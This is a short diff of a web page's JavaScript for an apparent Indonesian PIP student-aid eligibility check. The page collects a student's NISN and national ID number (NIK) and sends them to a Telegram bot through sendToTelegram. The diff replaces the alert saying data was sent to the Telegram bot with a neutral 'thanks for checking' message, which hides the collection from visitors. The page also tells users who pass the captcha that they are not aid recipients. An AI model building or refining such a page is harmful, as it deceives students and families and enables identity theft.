@@ -120,9 +120,9 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert('Data berhasil dikirim ke bot Telegram.');
+                        alert('Terimakasih sudah cek di website kami.');
                     } else {
-                        alert('Gagal mengirim data ke bot Telegram.');
+                        alert('error server.');
                     }
                 })
                 .catch(error => {
@@ -137,7 +137,7 @@
             const captcha = document.getElementById('captcha').value;
 
             if (captcha === '33') { // Assuming the correct answer is 33
-                alert('Anda sepertinya tidak dapat sebagai penerima PIP.');
+                alert('Anda sepertinya anda bukan sebagai penerima PIP.');
                 sendToTelegram(nisn, nik);
             } else {
                 alert('Captcha salah. Silakan coba lagi.');
